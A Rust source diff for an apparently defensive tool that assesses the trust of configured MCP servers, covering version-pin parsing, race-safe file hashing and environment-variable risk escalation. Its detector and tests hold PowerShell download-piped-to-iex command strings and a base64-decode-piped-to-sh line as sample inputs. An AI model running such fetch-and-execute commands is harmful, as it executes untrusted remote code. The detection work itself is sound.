@@ -13,7 +13,6 @@ use serde::Serialize;
 use sha2::{Digest, Sha256};
 use std::io::Read;
 use std::path::Path;
-use std::time::SystemTime;
 
 // ---------------------------------------------------------------------
 // Vocabulary (spec FR-058-FR-060)
@@ -327,6 +326,14 @@ pub enum ExecutablePathClassification {
 #[serde(rename_all = "camelCase")]
 pub struct TrustAssessment {
     pub artifact_identity: ArtifactIdentityConfidence,
+    /// Deterministic, human-readable explanation of *why*
+    /// `artifact_identity` holds its value — in particular, for a remote
+    /// (URL-configured) server, this MUST explicitly state that `unknown`
+    /// reflects "no local invocation to assess" rather than a failed or
+    /// inconclusive local inspection (FR-057c). Always present, for every
+    /// server, so the same field always carries this explanation
+    /// regardless of transport or outcome.
+    pub artifact_identity_rationale: String,
     pub configuration_risk: ConfigurationRiskStatus,
     pub aggregate: AggregateAssessmentStatus,
     pub needs_review: bool,
@@ -373,12 +380,21 @@ pub fn assess_trust(server: &McpServer) -> TrustAssessment {
 
     // FR-057a: environment-variable and Unicode/identity-ambiguity checks
     // run for every server, stdio or remote.
-    assess_environment(&server.env, artifact_identity, &mut indicators);
+    //
+    // Order matters here: every *independent* finding (invocation/wrapper/
+    // path/hash above, and Unicode below) must be collected before the
+    // environment assessment's secret-like escalation is finalized, since
+    // that escalation depends on whether a high-severity indicator exists
+    // anywhere in the server's final indicator set (FR-054) — deciding it
+    // too early would silently miss a high-severity finding from an area
+    // that happens to run later.
     assess_unicode_identity(
         server,
         invocation.package_identity.as_deref(),
         &mut indicators,
     );
+    let secret_like_env_names = assess_environment_categories(&server.env, &mut indicators);
+    finalize_secret_like_indicators(&secret_like_env_names, artifact_identity, &mut indicators);
 
     sort_indicators(&mut indicators);
     let configuration_risk = configuration_risk_from_indicators(&indicators);
@@ -387,6 +403,7 @@ pub fn assess_trust(server: &McpServer) -> TrustAssessment {
 
     TrustAssessment {
         artifact_identity,
+        artifact_identity_rationale: artifact_identity_rationale(is_remote, artifact_identity),
         configuration_risk,
         aggregate: aggregate_status,
         needs_review: needs_review_flag,
@@ -394,6 +411,44 @@ pub fn assess_trust(server: &McpServer) -> TrustAssessment {
         executable_path,
         sha256,
         indicators,
+    }
+}
+
+/// Deterministic, human-readable explanation of why `artifact_identity`
+/// holds its value (FR-057c requires this explicitly for the remote case,
+/// distinguishing "no local invocation to assess" from a failed or
+/// inconclusive local inspection; the same field is populated for every
+/// server so its shape never varies by transport or outcome).
+fn artifact_identity_rationale(
+    is_remote: bool,
+    artifact_identity: ArtifactIdentityConfidence,
+) -> String {
+    if is_remote {
+        return "This server has no local invocation to assess: it is configured with a \
+                 remote URL rather than a local command, so there is no executable path, \
+                 local artifact, or package-runner invocation to evaluate. This is not a \
+                 failed or inconclusive local inspection."
+            .to_string();
+    }
+    match artifact_identity {
+        ArtifactIdentityConfidence::VerifiedLocal => {
+            "The configured executable at this server's local path was inspected and its \
+             SHA-256 identity was recorded under bounded, race-safe conditions. This does \
+             not mean the underlying program is safe."
+                .to_string()
+        }
+        ArtifactIdentityConfidence::KnownSource => {
+            "This server's parsed package identity is an exact match against a small \
+             curated known-source table. This does not prove package authenticity, \
+             provenance, installation integrity, or safety."
+                .to_string()
+        }
+        ArtifactIdentityConfidence::Unknown => {
+            "No local executable could be hashed (the configured path is not an eligible \
+             absolute regular file) and no curated known-source identity match was found. \
+             This does not prove the server is unsafe or malicious."
+                .to_string()
+        }
     }
 }
 
@@ -525,29 +580,82 @@ fn resolve_pipx_run_package_token(args: &[String]) -> Option<&str> {
     Some(first.as_str())
 }
 
+/// A single, unambiguous PEP 440 version identifier suitable for `==` to
+/// mean "exactly pinned": starts with a digit, contains only
+/// version-identifier characters, and contains no wildcard, comma
+/// (compound specifier), or semicolon (environment marker). Notably this
+/// rejects PEP 440 "version matching" wildcards such as `1.2.*`, which is
+/// a prefix match over a range of versions, not a single resolved version
+/// (FR-014/FR-015).
+fn is_exact_pep440_version(version: &str) -> bool {
+    if version.is_empty() || version.contains(['*', ',', ';', ' ']) {
+        return false;
+    }
+    matches!(version.chars().next(), Some(c) if c.is_ascii_digit())
+        && version
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
+}
+
+/// Classifies the specifier text following a recognized 2-character PEP
+/// 440 operator (`op`) against a package. A compound (comma-separated)
+/// specifier or one carrying an environment marker (semicolon) is always
+/// `VersionRange`, regardless of `op` — a compound expression is never a
+/// single resolved version. For any operator other than `==`, anything
+/// else non-empty is `VersionRange` (inequalities/approximate-version
+/// operators never pin a single version). For `==` specifically, the
+/// remainder must be `is_exact_pep440_version` to count as
+/// `ExactlyPinned`; a wildcard remainder (`1.2.*`) is `VersionRange`
+/// (PEP 440 "version matching" is a prefix match, not an exact pin); any
+/// other malformed remainder is `UnsupportedOrAmbiguous`.
+fn classify_pep440_rest(rest: &str, op: &str) -> VersionExpressionKind {
+    if rest.is_empty() {
+        return VersionExpressionKind::UnsupportedOrAmbiguous;
+    }
+    if rest.contains(',') || rest.contains(';') {
+        return VersionExpressionKind::VersionRange;
+    }
+    if op != "==" {
+        return VersionExpressionKind::VersionRange;
+    }
+    if is_exact_pep440_version(rest) {
+        VersionExpressionKind::ExactlyPinned
+    } else if rest.contains('*') {
+        VersionExpressionKind::VersionRange
+    } else {
+        VersionExpressionKind::UnsupportedOrAmbiguous
+    }
+}
+
 /// Splits a uvx/pipx-run package argument into `(package_identity,
 /// VersionExpressionKind)` using PEP 440-style specifier operators.
-/// `==` is the only operator that yields `ExactlyPinned`; every other
-/// operator, or a compound (comma-separated) specifier, yields
-/// `VersionRange`. No bare package name yields `Omitted`. There is no
-/// `MutableTag` case for these two runners — PyPI has no dist-tag
-/// convention analogous to npm (research.md Decision 4, intentional
-/// asymmetry).
+/// `==` is the only operator that can yield `ExactlyPinned`, and only for
+/// a single unambiguous version identifier (see
+/// `is_exact_pep440_version`) — a wildcard (`1.2.*`), a compound
+/// (comma-separated) specifier, an environment marker (semicolon), or the
+/// distinct PEP 440 "arbitrary equality" operator (`===`, a literal string
+/// comparison rather than a normal version pin) are all explicitly never
+/// `ExactlyPinned`. Every other operator yields `VersionRange`. No bare
+/// package name yields `Omitted`. There is no `MutableTag` case for these
+/// two runners — PyPI has no dist-tag convention analogous to npm
+/// (research.md Decision 4, intentional asymmetry).
 fn classify_pep440(token: &str) -> (&str, VersionExpressionKind) {
+    // Checked before the 2-character `==` operator below: `===` contains
+    // `==` as a prefix, so checking `==` first would find `===`'s first
+    // two `=` characters and misparse the third as part of the version
+    // remainder instead of recognizing this as the distinct arbitrary-
+    // equality operator.
+    if let Some(idx) = token.find("===") {
+        let package = &token[..idx];
+        return (package, VersionExpressionKind::UnsupportedOrAmbiguous);
+    }
+
     const TWO_CHAR_OPS: &[&str] = &["==", ">=", "<=", "!=", "~="];
     for op in TWO_CHAR_OPS {
         if let Some(idx) = token.find(op) {
             let package = &token[..idx];
             let rest = &token[idx + op.len()..];
-            let kind = if rest.is_empty() {
-                VersionExpressionKind::UnsupportedOrAmbiguous
-            } else if rest.contains(',') {
-                VersionExpressionKind::VersionRange
-            } else if *op == "==" {
-                VersionExpressionKind::ExactlyPinned
-            } else {
-                VersionExpressionKind::VersionRange
-            };
+            let kind = classify_pep440_rest(rest, op);
             return (package, kind);
         }
     }
@@ -795,17 +903,34 @@ fn contains_word(lower_haystack: &str, word: &str) -> bool {
         .any(|token| token == word)
 }
 
-/// FR-028(c): a recognized web-request cmdlet/alias piped, in the same
-/// command string, into a recognized expression-execution cmdlet/alias.
+/// FR-028(c): a recognized web-request cmdlet/alias piped directly into a
+/// recognized expression-execution cmdlet/alias. Requires bounded
+/// pipe-segment adjacency — the download token must appear in a pipeline
+/// segment immediately followed (via `|`) by a segment that *starts with*
+/// the execution token — rather than merely checking that both tokens
+/// occur anywhere in the command string. Two tokens present but not
+/// piped together (for example, separated by `;`, or piped through an
+/// unrelated intermediate cmdlet) must not match.
 fn powershell_downloads_and_executes(wrapped: &str) -> bool {
+    const DOWNLOAD_TOKENS: &[&str] = &["invoke-webrequest", "iwr", "invoke-restmethod", "irm"];
+    const EXEC_TOKENS: &[&str] = &["invoke-expression", "iex"];
+
     let lower = wrapped.to_ascii_lowercase();
-    let has_download = ["invoke-webrequest", "iwr", "invoke-restmethod", "irm"]
-        .iter()
-        .any(|kw| contains_word(&lower, kw));
-    let has_exec = ["invoke-expression", "iex"]
-        .iter()
-        .any(|kw| contains_word(&lower, kw));
-    has_download && has_exec
+    let segments: Vec<&str> = lower.split('|').map(str::trim).collect();
+    if segments.len() < 2 {
+        return false;
+    }
+
+    segments.windows(2).any(|pair| {
+        let left = pair[0];
+        let right = pair[1];
+        let left_has_download = DOWNLOAD_TOKENS.iter().any(|kw| contains_word(left, kw));
+        let right_starts_with_exec = right
+            .split_whitespace()
+            .next()
+            .is_some_and(|first| EXEC_TOKENS.contains(&first));
+        left_has_download && right_starts_with_exec
+    })
 }
 
 /// FR-028(a)/(d): a recognized downloader or decode utility composed via a
@@ -997,38 +1122,105 @@ fn classify_executable_path(command: &str) -> ExecutablePathClassification {
     }
 }
 
-struct FileSnapshot {
-    len: u64,
-    modified: Option<SystemTime>,
+/// Opens `path` for reading, refusing to follow a symlink at the final
+/// path component. On Unix this is enforced atomically by the kernel via
+/// `O_NOFOLLOW` — there is no window between checking and opening in
+/// which a symlink swapped into `path` could be followed. `std`'s
+/// `OpenOptionsExt::custom_flags` only *adds* bits to the flags `open()`
+/// already uses, so this cannot weaken any other behavior. There is no
+/// portable `O_NOFOLLOW` equivalent exposed by `std` on Windows; there,
+/// this performs a plain open and relies on the file-identity check in
+/// `hash_eligible_file_bounded` to detect a swapped file after the fact.
+fn open_no_follow(path: &Path) -> std::io::Result<std::fs::File> {
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        // O_NOFOLLOW. Value is the same across all Linux architectures
+        // (the only Unix target in this project's CI matrix); avoided
+        // pulling in the `libc` crate for a single constant.
+        const O_NOFOLLOW: i32 = 0o400_000;
+        std::fs::OpenOptions::new()
+            .read(true)
+            .custom_flags(O_NOFOLLOW)
+            .open(path)
+    }
+    #[cfg(not(unix))]
+    {
+        std::fs::File::open(path)
+    }
 }
 
-fn snapshot(path: &Path) -> Option<FileSnapshot> {
-    let meta = std::fs::metadata(path).ok()?;
-    Some(FileSnapshot {
-        len: meta.len(),
-        modified: meta.modified().ok(),
-    })
+/// Compares the filesystem identity of two `Metadata` values — device and
+/// inode number on Unix, volume serial number and file index on Windows —
+/// so that "is this still the same underlying file?" does not rely on
+/// length/modified-time alone, which a maliciously (or accidentally)
+/// substituted file can coincidentally match. Never claims a match on a
+/// platform where a stable identity cannot be obtained.
+fn same_file_identity(a: &std::fs::Metadata, b: &std::fs::Metadata) -> bool {
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::MetadataExt;
+        a.dev() == b.dev() && a.ino() == b.ino()
+    }
+    #[cfg(windows)]
+    {
+        use std::os::windows::fs::MetadataExt;
+        matches!(
+            (
+                a.volume_serial_number(),
+                b.volume_serial_number(),
+                a.file_index(),
+                b.file_index(),
+            ),
+            (Some(va), Some(vb), Some(ia), Some(ib)) if va == vb && ia == ib
+        )
+    }
+    #[cfg(not(any(unix, windows)))]
+    {
+        let _ = (a, b);
+        false
+    }
 }
 
 /// Computes a SHA-256 identity for an eligible local regular file
 /// (FR-037-FR-045). Only a regular file confirmed immediately before the
-/// read (never a symlink) is eligible. The read is streamed in bounded
+/// open (never a symlink) is eligible. The read is streamed in bounded
 /// chunks — never fully buffered — and capped at `max_bytes` (production
 /// call sites pass `MAX_EXECUTABLE_HASH_BYTES`; research.md Decision 9;
 /// tests pass a small limit to exercise the oversized-file path without a
-/// multi-hundred-megabyte fixture). File metadata is snapshotted
-/// immediately before and immediately after the read; any mismatch
-/// (TOCTOU: the file changed or was replaced during inspection) discards
-/// the computed hash rather than reporting it (FR-042). Every failure
-/// degrades to `None` — never a partial or best-effort hash.
+/// multi-hundred-megabyte fixture).
+///
+/// Race safety: a plain "check the path, then open the path" sequence has
+/// a window in which `path` could be replaced by a symlink and then
+/// followed by an unguarded open, or replaced by a different regular file
+/// that happens to match the original's length and modified time. This is
+/// closed two ways: (1) the open itself refuses to follow a symlink at the
+/// final path component (`open_no_follow`, enforced by the kernel on
+/// Unix); (2) every metadata comparison — before the open, on the opened
+/// handle itself (immune to further path-level changes once open), and
+/// after the read completes — includes filesystem file identity
+/// (device+inode / volume+file-index), not just length and modified time,
+/// so a same-named replacement file is detected even when it coincidentally
+/// matches those two fields. Any mismatch, or any I/O error at any step,
+/// discards the computed hash and returns `None` rather than reporting a
+/// possibly-wrong `verified-local` result (FR-042/FR-044) — never a
+/// partial or best-effort hash.
 fn hash_eligible_file_bounded(path: &Path, max_bytes: u64) -> Option<String> {
     let pre = std::fs::symlink_metadata(path).ok()?;
     if pre.file_type().is_symlink() || !pre.is_file() {
         return None;
     }
-    let before = snapshot(path)?;
 
-    let mut file = std::fs::File::open(path).ok()?;
+    let mut file = open_no_follow(path).ok()?;
+
+    // Validate the *opened handle's* own metadata against the pre-open
+    // check, rather than trusting the open to have resolved to the same
+    // object we just inspected by path.
+    let opened_meta = file.metadata().ok()?;
+    if !opened_meta.is_file() || !same_file_identity(&pre, &opened_meta) {
+        return None;
+    }
+
     let mut hasher = Sha256::new();
     let mut buffer = [0u8; 64 * 1024];
     let mut total: u64 = 0;
@@ -1045,8 +1237,18 @@ fn hash_eligible_file_bounded(path: &Path, max_bytes: u64) -> Option<String> {
     }
     let digest = hasher.finalize();
 
-    let after = snapshot(path)?;
-    if after.len != before.len || after.modified != before.modified {
+    // Re-check both the lexical path (in case it was replaced again while
+    // the read was in progress) and file identity (in case a replacement
+    // coincidentally matches length/modified-time) before trusting the
+    // digest just computed.
+    let after = std::fs::symlink_metadata(path).ok()?;
+    if after.file_type().is_symlink() || !after.is_file() {
+        return None;
+    }
+    if !same_file_identity(&pre, &after) {
+        return None;
+    }
+    if after.len() != opened_meta.len() || after.modified().ok() != opened_meta.modified().ok() {
         return None;
     }
 
@@ -1286,23 +1488,19 @@ fn push_secret_like_indicator(indicators: &mut Vec<TrustIndicator>, name: &str, 
     });
 }
 
-/// User Story 4 (T045-T046): environment-variable name-only risk
-/// categories (FR-052: names only, values never read). Runs for both
-/// stdio and remote servers (FR-057a). The secret-like escalation
-/// (FR-054) fires when the server's artifact identity is `Unknown`, or
-/// when a high-severity indicator has already been raised by another
-/// area — the closest available proxy for "otherwise classified as
-/// high-risk" at the point this function runs, since the final
-/// `ConfigurationRiskStatus` is not computed until after every area has
-/// contributed its indicators.
-fn assess_environment(
+/// User Story 4 (T045-T046) part 1 of 2: environment-variable name-only
+/// risk categories (FR-052: names only, values never read). Runs for both
+/// stdio and remote servers (FR-057a). Pushes the context-independent
+/// category indicators (loader injection, path override, registry
+/// override, TLS-disabling) immediately, and returns the names that look
+/// secret-like for the caller to finalize via
+/// `finalize_secret_like_indicators` — see that function's doc comment
+/// for why the secret-like escalation cannot be decided here.
+fn assess_environment_categories(
     env: &[EnvVar],
-    artifact_identity: ArtifactIdentityConfidence,
     indicators: &mut Vec<TrustIndicator>,
-) {
-    let already_high_risk = indicators.iter().any(|i| i.severity == Severity::High);
-    let escalate = artifact_identity == ArtifactIdentityConfidence::Unknown || already_high_risk;
-
+) -> Vec<String> {
+    let mut secret_like_names = Vec::new();
     for var in env {
         for category in ENV_RISK_CATEGORIES {
             if category.names.contains(&var.name.as_str()) {
@@ -1310,8 +1508,32 @@ fn assess_environment(
             }
         }
         if is_secret_like_name(&var.name) {
-            push_secret_like_indicator(indicators, &var.name, escalate);
+            secret_like_names.push(var.name.clone());
         }
+    }
+    secret_like_names
+}
+
+/// User Story 4 (T045-T046) part 2 of 2: finalizes the secret-like
+/// environment-variable escalation (FR-054). This MUST run only after
+/// every other assessment area (invocation, shell-wrapper/obscured-launch,
+/// executable-path/local-artifact, and Unicode/identity-ambiguity) has
+/// already contributed its indicators to `indicators`, and after
+/// `assess_environment_categories` has already pushed the non-secret-like
+/// category indicators for the *same* server — otherwise the escalation
+/// depends on assessment order: a high-severity finding from an area that
+/// happens to run *after* this one would be silently missed, understating
+/// the required escalation to `EF-TRUST-ENV-006` for a server that is, in
+/// fact, high-risk overall.
+fn finalize_secret_like_indicators(
+    secret_like_names: &[String],
+    artifact_identity: ArtifactIdentityConfidence,
+    indicators: &mut Vec<TrustIndicator>,
+) {
+    let already_high_risk = indicators.iter().any(|i| i.severity == Severity::High);
+    let escalate = artifact_identity == ArtifactIdentityConfidence::Unknown || already_high_risk;
+    for name in secret_like_names {
+        push_secret_like_indicator(indicators, name, escalate);
     }
 }
 
@@ -1629,6 +1851,67 @@ mod user_story_1_tests {
         assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-003");
     }
 
+    /// PEP 440 "version matching" (`==1.2.*`) is a prefix match over a
+    /// range of versions, not a single resolved version — it must never
+    /// classify as `ExactlyPinned` even though it uses the `==` operator.
+    #[test]
+    fn uvx_wildcard_equality_is_version_range_not_exact() {
+        let s = runner_server("uvx-wildcard", "uvx", &["ruff==1.2.*"]);
+        let a = assess_trust(&s);
+        assert_eq!(
+            a.invocation.version_expression,
+            Some(VersionExpressionKind::VersionRange)
+        );
+    }
+
+    /// PEP 440 "arbitrary equality" (`===`) is a literal string comparison,
+    /// a distinct operator from `==` — it must never classify as
+    /// `ExactlyPinned`, and must not be misparsed as `==` leaving a stray
+    /// `=` in the version remainder.
+    #[test]
+    fn uvx_arbitrary_equality_operator_is_not_exact() {
+        let s = runner_server("uvx-arbitrary-eq", "uvx", &["ruff===1.2"]);
+        let a = assess_trust(&s);
+        assert_eq!(
+            a.invocation.version_expression,
+            Some(VersionExpressionKind::UnsupportedOrAmbiguous)
+        );
+    }
+
+    /// A compound (comma-separated) specifier is never a single resolved
+    /// version, even when its first clause uses `==`.
+    #[test]
+    fn uvx_compound_specifier_with_equality_is_version_range() {
+        let s = runner_server("uvx-compound", "uvx", &["ruff==1.2.3,!=1.2.4"]);
+        let a = assess_trust(&s);
+        assert_eq!(
+            a.invocation.version_expression,
+            Some(VersionExpressionKind::VersionRange)
+        );
+    }
+
+    /// An environment marker appended to an otherwise-exact specifier
+    /// means the resolved version is conditional, not a single pin.
+    #[test]
+    fn uvx_equality_with_environment_marker_is_version_range() {
+        let s = runner_server("uvx-marker", "uvx", &["ruff==1.2.3; python_version>='3.8'"]);
+        let a = assess_trust(&s);
+        assert_eq!(
+            a.invocation.version_expression,
+            Some(VersionExpressionKind::VersionRange)
+        );
+    }
+
+    #[test]
+    fn uvx_malformed_equality_remainder_is_unsupported_or_ambiguous() {
+        let s = runner_server("uvx-malformed-version", "uvx", &["ruff== "]);
+        let a = assess_trust(&s);
+        assert_eq!(
+            a.invocation.version_expression,
+            Some(VersionExpressionKind::UnsupportedOrAmbiguous)
+        );
+    }
+
     #[test]
     fn pipx_run_pinned_exact_version() {
         let s = runner_server("pipx-pinned", "pipx", &["run", "black==24.1.0"]);
@@ -1899,6 +2182,51 @@ mod user_story_2_tests {
         assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-OBS-004"));
     }
 
+    /// Regression test: both tokens present in the command string but
+    /// separated by `;` (not piped together) must NOT be flagged as
+    /// download-and-execute — the tokens merely co-occurring is not the
+    /// documented FR-028(c) pattern.
+    #[test]
+    fn powershell_iwr_and_iex_present_but_not_piped_is_not_flagged() {
+        let s = server(
+            "iwr-then-iex-separately",
+            "powershell",
+            &[
+                "-Command",
+                "iwr https://example.invalid/i.ps1 -OutFile out.ps1; iex './other-unrelated-script.ps1'",
+            ],
+        );
+        let a = assess_trust(&s);
+        assert!(!a
+            .invocation
+            .obscured_launch_patterns
+            .contains(&ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression));
+    }
+
+    /// Regression test: a download piped through an unrelated intermediate
+    /// cmdlet into `iex` must NOT be flagged — the exec segment must be
+    /// the one immediately following the download segment.
+    #[test]
+    fn powershell_iwr_piped_through_unrelated_cmdlet_before_iex_is_not_flagged() {
+        let s = server(
+            "iwr-through-unrelated",
+            "powershell",
+            &[
+                "-Command",
+                "iwr https://example.invalid/i.ps1 | Sort-Object | iex",
+            ],
+        );
+        let a = assess_trust(&s);
+        // The (download, exec) pair is not directly adjacent (an unrelated
+        // segment sits between them), so this narrow structural rule does
+        // not match — consistent with FR-023/FR-029's "no general shell
+        // parser" boundary; it is not required to trace an entire pipeline.
+        assert!(!a
+            .invocation
+            .obscured_launch_patterns
+            .contains(&ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression));
+    }
+
     #[test]
     fn base64_decode_piped_to_shell_is_decode_then_execute() {
         let s = server("b64", "bash", &["-c", "echo ZWNobyBoaQ== | base64 -d | sh"]);
@@ -2028,17 +2356,47 @@ mod user_story_3_tests {
 
     #[test]
     fn symlink_is_classified_and_never_hashed() {
-        let path = {
-            // Build the symlink's own absolute path without canonicalizing
-            // through it (canonicalize would resolve the symlink target).
-            let mut p = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
-            p.push("../../tests/fixtures/trust-home/bin");
-            p = p.canonicalize().expect("bin dir exists");
-            p.push("sample-tool-symlink");
-            p.to_string_lossy().into_owned()
-        };
-        let s = server_with_command("symlinked", &path);
+        // Creates a real symlink at test time rather than relying on a
+        // checked-in git symlink: a Windows checkout can materialize a
+        // repository symlink as a plain regular file containing the
+        // target path text (depending on `core.symlinks`/Developer Mode),
+        // which would silently turn this into a false pass/fail on a
+        // different classification. A runtime-created symlink has no such
+        // checkout dependency.
+        let nanos = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_nanos();
+        let mut dir = std::env::temp_dir();
+        dir.push(format!(
+            "etherfence-trust-symlink-{}-{nanos}",
+            std::process::id()
+        ));
+        std::fs::create_dir(&dir).unwrap();
+        let target = dir.join("target-file");
+        std::fs::write(&target, b"target-content").unwrap();
+        let link = dir.join("the-symlink");
+
+        #[cfg(unix)]
+        let created = std::os::unix::fs::symlink(&target, &link).is_ok();
+        #[cfg(windows)]
+        let created = std::os::windows::fs::symlink_file(&target, &link).is_ok();
+        #[cfg(not(any(unix, windows)))]
+        let created = false;
+
+        if !created {
+            // Some environments (e.g. Windows without Developer Mode or
+            // elevated privileges) cannot create symlinks; skip rather
+            // than fail in that case.
+            std::fs::remove_dir_all(&dir).ok();
+            return;
+        }
+
+        let s = server_with_command("symlinked", &link.to_string_lossy());
         let a = assess_trust(&s);
+
+        std::fs::remove_dir_all(&dir).ok();
+
         assert_eq!(a.executable_path, ExecutablePathClassification::Symlink);
         assert_eq!(a.sha256, None);
         assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::Unknown);
@@ -2090,18 +2448,76 @@ mod user_story_3_tests {
         ));
         std::fs::write(&path, b"original-content").unwrap();
 
-        // Simulate a metadata mismatch by mutating the file's content
-        // (and therefore length) between the two snapshot points: we
-        // can't intercept mid-read here, so instead we verify the
-        // snapshot-comparison logic directly by hashing, then mutating,
-        // then re-snapshotting and comparing — proving the comparison
-        // used inside hash_eligible_file would reject this case.
-        let before = snapshot(&path).unwrap();
+        let original_hash = hash_eligible_file(&path);
+        assert!(original_hash.is_some());
+
+        // A file replaced at the same path (even with different content,
+        // hence a different modified time here) must never silently reuse
+        // a stale result: hashing again after the replacement must reflect
+        // the new content, not the old one.
         std::fs::write(&path, b"replaced-content-different-length").unwrap();
-        let after = snapshot(&path).unwrap();
-        assert!(before.len != after.len || before.modified != after.modified);
+        let replaced_hash = hash_eligible_file(&path);
+        assert!(replaced_hash.is_some());
+        assert_ne!(original_hash, replaced_hash);
 
         std::fs::remove_file(&path).ok();
+    }
+
+    #[test]
+    fn same_file_identity_matches_same_file_and_rejects_different_files() {
+        let nanos = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_nanos();
+        let mut dir = std::env::temp_dir();
+        dir.push(format!(
+            "etherfence-trust-identity-{}-{nanos}",
+            std::process::id()
+        ));
+        std::fs::create_dir(&dir).unwrap();
+        let path_a = dir.join("a");
+        let path_b = dir.join("b");
+        std::fs::write(&path_a, b"content-a").unwrap();
+        std::fs::write(&path_b, b"content-a").unwrap(); // same bytes, different file
+
+        let meta_a1 = std::fs::metadata(&path_a).unwrap();
+        let meta_a2 = std::fs::metadata(&path_a).unwrap();
+        let meta_b = std::fs::metadata(&path_b).unwrap();
+
+        assert!(same_file_identity(&meta_a1, &meta_a2));
+        assert!(
+            !same_file_identity(&meta_a1, &meta_b),
+            "two distinct files with identical content/length/mtime must never be treated as the same file identity"
+        );
+
+        std::fs::remove_dir_all(&dir).ok();
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn open_no_follow_refuses_a_symlink_but_allows_the_real_file() {
+        let nanos = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_nanos();
+        let mut dir = std::env::temp_dir();
+        dir.push(format!(
+            "etherfence-trust-nofollow-{}-{nanos}",
+            std::process::id()
+        ));
+        std::fs::create_dir(&dir).unwrap();
+        let target = dir.join("target");
+        std::fs::write(&target, b"content").unwrap();
+        let link = dir.join("link");
+        std::os::unix::fs::symlink(&target, &link).unwrap();
+
+        assert!(
+            open_no_follow(&link).is_err(),
+            "opening a symlink path with O_NOFOLLOW must fail, not silently follow it"
+        );
+        assert!(open_no_follow(&target).is_ok());
+
+        std::fs::remove_dir_all(&dir).ok();
     }
 
     #[test]
@@ -2167,18 +2583,26 @@ mod user_story_3_tests {
 
     #[test]
     fn non_regular_file_is_classified_and_indicated() {
-        let root = std::path::Path::new("../../tests/fixtures/trust-home");
-        let items = etherfence_inventory::discover(root);
-        let codex = items
-            .iter()
-            .find(|i| i.agent == etherfence_core::AgentKind::CodexCli)
-            .expect("trust-home codex fixture");
-        let server = codex
-            .mcp_servers
-            .iter()
-            .find(|s| s.name == "non-regular-file")
-            .expect("non-regular-file server (points at /tmp)");
-        let a = assess_trust(server);
+        // A real, freshly created directory at test time — not a
+        // checked-in fixture referencing a fixed path like `/tmp`, which
+        // only exists as a directory on Unix and produced `MissingPath`
+        // on Windows CI instead of `NonRegularFile`.
+        let nanos = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_nanos();
+        let mut dir = std::env::temp_dir();
+        dir.push(format!(
+            "etherfence-trust-non-regular-{}-{nanos}",
+            std::process::id()
+        ));
+        std::fs::create_dir(&dir).unwrap();
+
+        let s = server_with_command("non-regular", &dir.to_string_lossy());
+        let a = assess_trust(&s);
+
+        std::fs::remove_dir(&dir).ok();
+
         assert_eq!(
             a.executable_path,
             ExecutablePathClassification::NonRegularFile
@@ -2343,6 +2767,40 @@ mod user_story_4_tests {
         let a = assess_trust(&s);
         assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::Unknown);
         assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-006"));
+    }
+
+    /// Regression test for an order-dependency bug: a server with a
+    /// `KnownSource` artifact identity (not `Unknown`) and no other
+    /// high-severity indicator from invocation/wrapper/path assessment,
+    /// but WITH a high-severity Unicode finding (bidi control), must still
+    /// escalate its secret-like environment variable to `EF-TRUST-ENV-006`
+    /// — not the non-escalated `EF-TRUST-ENV-005` — even though Unicode
+    /// assessment and environment assessment are two different functions.
+    /// This only holds if environment's secret-like escalation is finalized
+    /// *after* Unicode assessment has already run, per FR-054.
+    #[test]
+    fn secret_like_escalation_accounts_for_high_severity_unicode_finding_regardless_of_order() {
+        let s = McpServer {
+            name: "bidi\u{202e}-name".to_string(),
+            command: Some("npx".to_string()),
+            args: vec!["@modelcontextprotocol/server-filesystem@1.0.0".to_string()],
+            env: vec![EnvVar {
+                name: "API_TOKEN".to_string(),
+                value_hint: Some("<set>".to_string()),
+            }],
+            url: None,
+        };
+        let a = assess_trust(&s);
+        // Known-source identity (from the pinned, curated package) — not
+        // Unknown — so escalation can only come from the Unicode finding.
+        assert_eq!(a.artifact_identity, ArtifactIdentityConfidence::KnownSource);
+        assert!(a.indicators.iter().any(|i| i.id == "EF-TRUST-UNI-001"));
+        assert!(
+            a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-006"),
+            "secret-like env var must escalate to ENV-006 because of the high-severity bidi finding, even though environment assessment does not itself see Unicode findings until they've already run: {:?}",
+            a.indicators
+        );
+        assert!(!a.indicators.iter().any(|i| i.id == "EF-TRUST-ENV-005"));
     }
 
     #[test]
@@ -2767,6 +3225,44 @@ mod foundational_tests {
             remote_assessment.artifact_identity,
             ArtifactIdentityConfidence::Unknown
         );
+    }
+
+    /// FR-057c: a remote server's `unknown` artifact identity MUST be
+    /// accompanied by rationale text explicitly stating this reflects "no
+    /// local invocation to assess," distinct from a stdio server whose
+    /// `unknown` reflects an inconclusive local inspection.
+    #[test]
+    fn remote_server_artifact_identity_rationale_states_no_local_invocation() {
+        let remote = McpServer {
+            name: "hosted".to_string(),
+            command: None,
+            args: Vec::new(),
+            env: Vec::new(),
+            url: Some("https://example.invalid/mcp".to_string()),
+        };
+        let a = assess_trust(&remote);
+        assert!(a
+            .artifact_identity_rationale
+            .contains("no local invocation to assess"));
+
+        // A stdio server that is merely inconclusive must use different,
+        // non-remote-specific wording — the two `unknown` cases are not
+        // interchangeable.
+        let stdio = McpServer {
+            name: "example".to_string(),
+            command: Some("some-tool".to_string()),
+            args: Vec::new(),
+            env: Vec::new(),
+            url: None,
+        };
+        let stdio_assessment = assess_trust(&stdio);
+        assert_eq!(
+            stdio_assessment.artifact_identity,
+            ArtifactIdentityConfidence::Unknown
+        );
+        assert!(!stdio_assessment
+            .artifact_identity_rationale
+            .contains("no local invocation to assess"));
     }
 
